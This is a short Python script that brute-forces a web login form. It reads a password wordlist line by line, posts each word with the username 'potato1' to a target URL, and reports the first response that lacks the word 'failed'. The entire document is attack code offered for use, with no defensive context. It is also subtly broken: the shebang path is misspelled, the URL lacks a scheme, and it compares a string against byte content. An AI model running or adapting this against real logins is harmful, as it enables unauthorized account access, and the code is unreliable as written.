#!/use/bin/env python
import requests

target_url = "example.com"
# last item in dictionary is the button for submitting
data_dict = {"username": "potato1", "password":"", "Login":"submit"}

with open("path/to/dictionary.txt", "r") as wordlist_file:
  for line in wordlist_file:
    # assuming each keyword is on its own line in the text file, otherwise use split(",") or something
    word = line.strip()
    # set value at "password" to current word in iteration
    data_dict["password"] = word
    response = requests.post(target_url, data=data_dict)
    if "failed" not in response.content:
      print("Password found --> " + word)
      exit()
print("Password not in word-list")